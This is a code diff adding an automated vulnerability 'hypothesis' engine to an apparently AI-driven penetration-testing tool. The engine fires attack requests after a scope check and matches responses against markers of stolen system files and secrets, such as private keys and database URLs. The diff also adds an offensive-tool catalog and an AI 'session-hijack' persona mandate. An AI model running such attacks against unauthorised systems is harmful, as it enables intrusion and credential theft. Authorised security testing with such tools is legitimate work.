+                    hits.append({"param": "replay", "original": "request #1",
+                                 "payload": "request #2 (identical)",
+                                 "baseline": _gate_brief(b1),
+                                 "attack": _gate_brief(a), "url": u,
+                                 "decisive": decisive, "reason": reason,
+                                 "stable": True})
                 continue
             for p in t["params"]:
                 if p not in params:
@@ -4760,7 +5247,7 @@ def cmd_testers(args):
     if json_mode:
         _emit(args, payload)
     else:
-        print(f"═══ {produced}/8 tester(s) produced findings · {confirmed} confirmed"
+        print(f"═══ {produced}/{len(TESTERS)} tester(s) produced findings · {confirmed} confirmed"
               f" · {hypotheses} hypothesis · {total} differential(s)"
               f" · deduped into the ledger ═══")
     if srv:
@@ -4807,6 +5294,310 @@ def cmd_coverage(args):
     print(f"  gaps: {', '.join(g['phase'] for g in gaps) or 'none — full coverage'}")
     if gaps:
         print(f"  next mandates: {' → '.join(payload['next_mandates'])}")
+    return 0
+
+
+# ── v5.6.0 THE REASONING ENGINE ──────────────────────────────────────────────
+
+def cmd_hypothesis(args):
+    """THE REASONING ENGINE — the family's datasets → ranked, wall-checked
+    hypothesis cards that guide ANY model toward unconfirmed vulnerability
+    instances. Generation is offline reasoning (no live fire); every card's
+    execution still goes through the same scope authority and 3-gate engine."""
+    import hypothesis as hy
+    camp = _camp(args.target)
+    _ensure_campaign(args.target, url=getattr(args, "url", None))
+    state = hy.load_state(camp)
+    kinds = tuple(k.strip() for k in (args.kinds or
+                 "surface,cve-map,variant,chain").split(",") if k.strip())
+    out = hy.generate(state, args.target, url=getattr(args, "url", None),
+                      kinds=kinds)
+    cards = out["cards"]
+
+    # the wall, in code: a card whose asset is a URL must pass the scope gate
+    # or it is marked scope-blocked (execution would refuse anyway — marking
+    # it here keeps the model from wasting a turn on it)
+    for c in cards:
+        asset = c.get("asset") or ""
+        if asset.startswith(("http://", "https://")):
+            ok, _reason, _ = sa.check(asset, strict=True, audit=False,
+                                      allow_lab=True)
+            c["scope"] = "ok" if ok else "blocked"
+        else:
+            c["scope"] = "ok"
+    blocked = sum(1 for c in cards if c.get("scope") == "blocked")
+
+    # persist the generation + mark what is new since the last one; a card
+    # already FIRED keeps its verdict/status across regeneration (regenerating
+    # must never make the engine re-fire the same hypothesis)
+    prev = _load_json(camp / "hypothesis-state.json", {"cards": []})
+    prev_by_key = {(p.get("kind"), p.get("cls"), p.get("asset"), p.get("title")):
+                   p for p in prev.get("cards", [])}
+    seen = {(p.get("cls"), p.get("asset"), p.get("kind"))
+            for p in prev.get("cards", [])}
+    for c in cards:
+        old = prev_by_key.get((c["kind"], c["cls"], c.get("asset"), c.get("title")))
+        if old and old.get("status"):
+            c["status"] = old["status"]
+            c["finding"] = old.get("finding")
+            c["fired"] = old.get("fired")
+            c["at"] = old.get("at")
+    fresh = [c for c in cards if (c["cls"], c.get("asset"), c["kind"]) not in seen]
+    _atomic_write(camp / "hypothesis-state.json",
+                  json.dumps({"generated": _now(), "target": args.target,
+                              "kinds": list(kinds), "cards": cards[:200]},
+                             indent=2))
+    _event(args.target, "hypothesis",
+           f"generated {len(cards)} cards ({len(fresh)} new · {blocked} scope-blocked)")
+
+    if args.action == "brief":
+        brief = out["brief"]
+        if _json_mode(args):
+            _emit(args, brief)
+            return 0
+        print(f"═══ HYPOTHESIS BRIEF — '{args.target}' · {brief['shown']}/{brief['count']} cards ═══")
+        print("  the loop (the model reasons over this; the kernel executes it):")
+        for step in brief["loop"]:
+            print(f"    {step}")
+        print("  rules:")
+        for r in brief["rules"]:
+            print(f"    · {r}")
+        print()
+        for c in brief["hypotheses"]:
+            mark = "✓" if c.get("scope") == "ok" else "⛔"
+            print(f"  {mark} {c['id']} [{c['kind']:7s}] {c['cls']:10s} "
+                  f"score={c['score']:.2f}  {c['title'][:70]}")
+            for w in c["why"]:
+                print(f"      why: {w}")
+            probe = c.get("probe") or {}
+            if probe.get("attacks"):
+                print(f"      probe: GET {probe.get('url')} param={probe.get('param')} "
+                      f"attacks={probe['attacks'][:3]}")
+            elif probe.get("payloads"):
+                print(f"      probe payloads: {probe['payloads'][:3]}")
+            elif probe.get("paths"):
+                print(f"      probe paths: {probe['paths']}")
+            if c.get("citations"):
+                print(f"      citations: {', '.join(c['citations'])}")
+        return 0
+
+    payload = {"target": args.target, "kinds": list(kinds), "total": len(cards),
+               "new": len(fresh), "scope_blocked": blocked,
+               "cards": cards, "brief": out["brief"]}
+    if _json_mode(args):
+        _emit(args, payload)
+        return 0
+    print(f"═══ SPYDERMONKEY HYPOTHESIS ENGINE — {len(cards)} card(s) "
+          f"({len(fresh)} new · {blocked} scope-blocked) ═══")
+    for c in cards[:24]:
+        mark = "✓" if c.get("scope") == "ok" else "⛔"
+        print(f"  {mark} {c['id']} [{c['kind']:7s}] {c['cls']:10s} "
+              f"score={c['score']:.2f}  {c['title'][:72]}")
+        print(f"      why: {'; '.join(c['why'][:2])}")
+    if len(cards) > 24:
+        print(f"  … {len(cards) - 24} more (—json for all · hypothesis brief for the model document)")
+    return 0
+
+
+def _hypothesis_request_pair(card: dict, ledger: list) -> tuple:
+    """Build (baseline_kwargs, [(payload, attack_kwargs)]) from a card's probe.
+    Returns (None, []) when the card is not auto-executable (chain plans and
+    class-specific shapes). kwargs feed _http directly."""
+    from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit
+    probe = card.get("probe") or {}
+    cls = card.get("cls")
+
+    if card.get("kind") == "surface" and cls == "CORS":
+        base = probe.get("url") or card.get("asset")
+        if not base:
+            return None, []
+        b = {"method": "GET", "url": base,
+             "headers": {"Origin": "https://baseline.probe.invalid"}}
+        a = {"method": "GET", "url": base,
+             "headers": {"Origin": "https://cors.probe.invalid"}}
+        return b, [("https://cors.probe.invalid", a)]
+
+    if card.get("kind") == "surface" and probe.get("attacks") and probe.get("url"):
+        base = probe["url"]
+        param = probe.get("param")
+        params = dict(parse_qsl(probe.get("baseline") or "",
+                                keep_blank_values=True))
+        baseline = base + ("?" + urlencode(params) if params else "")
+        out = []
+        for atk in probe["attacks"]:
+            q = {k: v for k, v in params.items() if k != param}
+            q[param] = atk
+            out.append((atk, {"method": "GET",
+                              "url": base + "?" + urlencode(q)}))
+        return {"method": "GET", "url": baseline}, out
+
+    if card.get("kind") == "variant" and probe.get("payloads"):
+        parent = next((r for r in ledger
+                       if r.get("id") == card.get("parent")), None)
+        asset = (parent or {}).get("asset") or card.get("asset") or ""
+        if not asset.startswith(("http://", "https://")):
+            return None, []
+        sp = urlsplit(asset)
+        pairs = parse_qsl(sp.query, keep_blank_values=True)
+        if not pairs:
+            return None, []
+        p0 = pairs[0][0]
+        base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
+        out = []
+        for atk in probe["payloads"]:
+            if atk == "__SHAPE_SUCCESSOR__":
+                continue
+            q = dict(pairs)
+            q[p0] = atk
+            out.append((atk, {"method": "GET",
+                              "url": base + "?" + urlencode(q)}))
+        return {"method": "GET", "url": asset}, out
+    return None, []
+
+
+# decisive body markers per class — the same evidence the batteries demand
+HYP_SIGNATURES = {
+    "TRAVERSAL": ("root:x:0:0", "root:*:0:0", "daemon:"),
+    "NOSQL": ('"authenticated": true', '"role": "admin"', '"bypass": true'),
+    "HARVEST": ("secret", "api_key", "password=", "ref: refs/",
+                "BEGIN PRIVATE KEY", "DATABASE_URL"),
+    "DIRECTORY": ("index of /", "<title>directory listing"),
+    "AUTHN": ('"authenticated": true', '"bypass": true', '"role": "admin"'),
+}
+
+
+def cmd_hypothesis_run(args):
+    """Execute ONE hypothesis card through the SAME 3-gate discipline the
+    batteries use: baseline → attack → class verdict → ledger. Confirmed
+    cards register CONFIRMED; non-decisive diffs register HYPOTHESIS;
+    identical responses register NOTHING (never speculation)."""
+    camp = _camp(args.target)
+    _ensure_campaign(args.target)
+    hstate = _load_json(camp / "hypothesis-state.json", {"cards": []})
+    cards = hstate.get("cards", [])
+    if not cards:
+        print("✗ no hypothesis cards — run `hypothesis gen --target "
+              f"{args.target}` first", file=sys.stderr)
+        return 2
+    ledger = _ledger_load(args.target)
+    card = None
+    if getattr(args, "id", None):
+        card = next((c for c in cards if c.get("id") == args.id), None)
+        if card is None:
+            print(f"✗ no card {args.id}", file=sys.stderr)
+            return 2
+    else:
+        # the highest-scored card that is auto-executable and not yet fired
+        for c in cards:
+            if c.get("status") in ("confirmed", "hypothesis", "disproven"):
+                continue
+            b, atks = _hypothesis_request_pair(c, ledger)
+            if b and atks:
+                card = c
+                break
+        if card is None:
+            print("✗ no auto-executable card left — every card was fired or "
+                  "needs a class-specific runner (`hypothesis brief`)",
+                  file=sys.stderr)
+            return 2
+
+    if card.get("scope") == "blocked":
+        print(f"✗ card {card['id']} is scope-blocked — refusing", file=sys.stderr)
+        return 2
+    baseline, attacks = _hypothesis_request_pair(card, ledger)
+    if not baseline or not attacks:
+        print(f"✗ card {card['id']} is not auto-executable "
+              f"({card['kind']} · {card['cls']}) — see `hypothesis brief`",
+              file=sys.stderr)
+        return 2
+    # the wall: the baseline AND every attack url pass the live-fire gate
+    for _p, akw in [(-1, baseline)] + list(attacks):
+        if not _scope_gate(akw["url"], quiet=True):
+            print(f"✗ refusing — attack url outside the declared estate: "
+                  f"{akw['url']}", file=sys.stderr)
+            return 2
+
+    timeout = getattr(args, "timeout", 8)
+    t = {"name": card["cls"], "signatures": HYP_SIGNATURES.get(card["cls"], ())}
+    confirmed = None
+    hypothesis = None
+    tried = 0
+    if not _json_mode(args):
+        print(f"═══ HYPOTHESIS RUN — {card['id']} [{card['kind']}] {card['cls']} "
+              f"on {card.get('asset', '')[:60]} ═══")
+        print(f"  why: {'; '.join(card.get('why', [])[:2])}")
+    for payload, akw in attacks:
+        b = _http(baseline["url"], method=baseline.get("method", "GET"),
+                  headers=baseline.get("headers"), timeout=timeout)
+        a = _http(akw["url"], method=akw.get("method", "GET"),
+                  headers=akw.get("headers"), timeout=timeout)
+        tried += 1
+        hit, decisive, reason = _tester_verdict(t, str(payload), b, a)
+        if not _json_mode(args):
+            mark = "✓" if decisive else ("·" if hit else "—")
+            print(f"  {mark} {str(payload)[:48]:48s} "
+                  f"{b['status']}/{len(b['body'])}B → {a['status']}/{len(a['body'])}B  {reason}")
+        if decisive:
+            confirmed = {"payload": payload, "baseline": b, "attack": a,
+                         "reason": reason}
+            break
+        if hit and hypothesis is None:
+            hypothesis = {"payload": payload, "baseline": b, "attack": a,
+                          "reason": reason}
+
+    verdict = "disproven"
+    finding_id = None
+    if confirmed:
+        proof = (f"baseline: {baseline['url'][:110]} → "
+                 f"{confirmed['baseline']['status']} len={len(confirmed['baseline']['body'])}; "
+                 f"attack: {confirmed['attack']['url'][:110]} → "
+                 f"{confirmed['attack']['status']} len={len(confirmed['attack']['body'])}; "
+                 f"diff: {confirmed['reason']}; "
+                 f"hypothesis: {card['id']} ({card['kind']})")
+        e = _cmd_ledger_internal(args.target, card["title"], card["cls"],
+                                 confirmed["attack"]["url"],
+                                 card.get("severity_guess", "medium"), proof)
+        finding_id = e.get("id")
+        verdict = "confirmed"
+    elif hypothesis:
+        proof = (f"baseline: {baseline['url'][:110]} → "
+                 f"{hypothesis['baseline']['status']} len={len(hypothesis['baseline']['body'])}; "
+                 f"attack: {hypothesis['attack']['url'][:110]} → "
+                 f"{hypothesis['attack']['status']} len={len(hypothesis['attack']['body'])}; "
+                 f"diff: {hypothesis['reason']}; "
+                 f"hypothesis: {card['id']} ({card['kind']})")
+        e = _cmd_ledger_internal(args.target, card["title"], card["cls"],
+                                 hypothesis["attack"]["url"],
+                                 card.get("severity_guess", "medium"), proof,
+                                 force_hypothesis=True)
+        finding_id = e.get("id")
+        verdict = "hypothesis"
+
+    # persist the card's outcome — the regeneration loop reads this
+    for c in cards:
+        if c.get("id") == card["id"]:
+            c["status"] = verdict
+            c["fired"] = tried
+            c["finding"] = finding_id
+            c["at"] = _now()
+    hstate["cards"] = cards
+    _atomic_write(camp / "hypothesis-state.json",
+                  json.dumps(hstate, indent=2))
+    payload = {"target": args.target, "card": card["id"], "kind": card["kind"],
+               "cls": card["cls"], "verdict": verdict, "tried": tried,
+               "finding": finding_id}
+    if _json_mode(args):
+        _emit(args, payload)
+        return 0
+    if verdict == "confirmed":
+        print(f"  ✓ CONFIRMED — new finding {finding_id} registered in the ledger")
+        print(f"  ▸ regenerate: spydermonkey hypothesis gen --target {args.target}")
+    elif verdict == "hypothesis":
+        print(f"  ⚠ HYPOTHESIS — differential not decisive; {finding_id} "
+              f"registered at confidence 0.4 (never suppressed)")
+    else:
+        print("  ✗ DISPROVEN — responses identical on every attack; "
+              "nothing registered (no speculation)")
     return 0
 
 
@@ -5413,11 +6204,16 @@ def _run_selftest(quick: bool = False) -> dict:
         if not quick:
             json_run("testers demo",
                      ["testers", "--target", "selftest", "--demo"],
-                     lambda p: len(p.get("testers", [])) == 11 and p.get("confirmed", 0) >= 1,
-                     timeout=60)
+                     lambda p: len(p.get("testers", [])) == 18 and p.get("confirmed", 0) >= 1,
+                     timeout=90)
             json_run("chain detect",
                      ["chain", "detect", "--target", "selftest"],
                      lambda p: len(p.get("chains", [])) >= 1)
+            json_run("hypothesis gen",
+                     ["hypothesis", "gen", "--target", "selftest", "--json"],
+                     lambda p: p.get("total", 0) >= 1
+                     and all(c.get("walls") for c in p.get("cards", [])),
+                     timeout=60)
         json_run("phases board", ["phases", "--target", "selftest"],
                  lambda p: p.get("total") == 13 and len(p.get("phases", [])) == 13)
         if not quick:
@@ -5596,6 +6392,8 @@ def _build_parser() -> argparse.ArgumentParser:
                          "(default: AUTOPILOT — the engines run their own directives)")
     lp.add_argument("--max-steps", dest="max_steps", type=int, default=12)
     lp.add_argument("--agent-timeout", dest="agent_timeout", type=int, default=900)
+    lp.add_argument("--trace-file", dest="trace_file",
+                    help="append every loop step (directive→result→verdict) as JSONL — the training-data collector")
     lp.add_argument("--plan-only", dest="plan_only", action="store_true",
                     help="print the battle plan, execute nothing")
     ms.add_argument("--plan", action="store_true", help="show the mission plan; execute nothing")
@@ -5680,7 +6478,7 @@ def _build_parser() -> argparse.ArgumentParser:
     gt.add_argument("--replay", action="store_true",
                     help="with --prove: re-fire the stored requests")
 
-    ch = sub.add_parser("chain", help="8 chain patterns: low findings → high-impact chains")
+    ch = sub.add_parser("chain", help="10 chain patterns: low findings → high-impact chains")
     ch.add_argument("action", choices=("detect", "plan", "list"))
     ch.add_argument("--target", required=True)
     ch.add_argument("--id", dest="chain_id", help="CH-NNN for plan")
@@ -5691,6 +6489,15 @@ def _build_parser() -> argparse.ArgumentParser:
     ch.add_argument("--severity", choices=("info", "low", "medium", "high", "critical"))
     ch.add_argument("--min-confidence", dest="min_confidence", type=float, default=0.0)
     ch.add_argument("--include-hypothesis", dest="include_hypothesis", action="store_true")
+
+    # ── v5.6.0: the reasoning engine ─────────────────────────────────────────
+    hp = sub.add_parser("hypothesis", help="THE REASONING ENGINE: datasets → ranked, wall-checked hypothesis cards that guide a model to unconfirmed vuln instances")
+    hp.add_argument("action", choices=("gen", "brief", "run"))
+    hp.add_argument("--target", required=True)
+    hp.add_argument("--url", help="one surface url to reason from (else the mined context)")
+    hp.add_argument("--kinds", help="comma list: surface,cve-map,variant,chain (default: all)")
+    hp.add_argument("--id", dest="id", help="run: the card id (default: top executable card)")
+    hp.add_argument("--timeout", type=int, default=8)
 
     cx = sub.add_parser("context", help="session context: endpoints · roles · credentials · functions")
     cx.add_argument("action", choices=("set", "show", "remove", "clear"))
@@ -5737,6 +6544,8 @@ def _build_parser() -> argparse.ArgumentParser:
     wt.add_argument("--max-cycles", dest="max_cycles", type=int, default=0, help="0 = until Ctrl-C")
     wt.add_argument("--max-steps", dest="max_steps", type=int, default=12)
     wt.add_argument("--cycle-timeout", dest="cycle_timeout", type=int, default=10)
+    wt.add_argument("--trace-file", dest="trace_file",
+                    help="append every loop step (directive→result→verdict) as JSONL — the training-data collector")
     wt.add_argument("--notify-cmd", dest="notify_cmd", help='external notifier, e.g. "notify-send"')
 
     # ── serve: the localhost war board ────────────────────────────────────────
@@ -5744,7 +6553,7 @@ def _build_parser() -> argparse.ArgumentParser:
     wt.add_argument("--json", action="store_true")
     sv.add_argument("--port", type=int, default=9644)
 
-    ts = sub.add_parser("testers", help="8 parallel sub-testers over the session context")
+    ts = sub.add_parser("testers", help="18 parallel sub-testers over the session context")
     ts.add_argument("--target", required=True)
     ts.add_argument("--url", action="append",
                     help="baseline target url (repeatable: one entry per surface)")
@@ -5800,6 +6609,8 @@ def _build_parser() -> argparse.ArgumentParser:
 
     mf = sub.add_parser("mandate", help="print the injectable mandate (persona contract)")
     mf.add_argument("--file", action="store_true", help="print path only")
+    mf.add_argument("--session", action="store_true",
+                    help="print the session-hijack mandate (the /spydermonkey injection contract) instead")
 
     sc = sub.add_parser("scope", help="the scope authority: init · check · show · add · remove · history · extend")
     sc.add_argument("action", choices=("init", "check", "show", "add", "remove",
@@ -5834,6 +6645,13 @@ def _build_parser() -> argparse.ArgumentParser:
     ar.add_argument("--wordlist")
     ar.add_argument("--timeout", type=int, default=300)
     ar.add_argument("--output-dir")
+
+    cg = sub.add_parser("catalog", help="KNOWN TOOL CATALOG: 1,053+ offensive tools — lazy-loaded reference metadata (info only; execution = arsenal, scope-gated)")
+    cg.add_argument("action", choices=("stats", "categories", "list", "search", "show"),
+                    nargs="?", default="stats")
+    cg.add_argument("term", nargs="?", help="search term / tool name for show")
+    cg.add_argument("--cat", help="filter by category prefix (e.g. web, recon/dns, wifi, ad)")
+    cg.add_argument("--limit", type=int, default=50)
 
     fl = sub.add_parser("fleet", help="PARALLEL multi-agent dispatch: one agent per mandate")
     fl.add_argument("--goal", required=True)
@@ -5882,6 +6700,10 @@ def _dispatch(a) -> int:
         if a.action == "plan" and not a.chain_id and a.pattern != "custom":
             raise UsageError("chain plan needs --id CH-NNN (or --pattern custom --requires A+B)")
         return cmd_chain(a)
+    if a.cmd == "hypothesis":
+        if a.action == "run":
+            return cmd_hypothesis_run(a)
+        return cmd_hypothesis(a)
     if a.cmd == "context":
         if a.action in ("set", "remove") and not (a.kind and a.value):
             raise UsageError(f"context {a.action} needs --kind and --value")
@@ -5931,6 +6753,8 @@ def _dispatch(a) -> int:
         return cmd_mandate(a)
     if a.cmd == "arsenal":
         return _exec_arsenal(a)
+    if a.cmd == "catalog":
+        return cmd_catalog(a)
     if a.cmd == "scope":
         return cmd_scope(a)
     if a.cmd == "doctor":
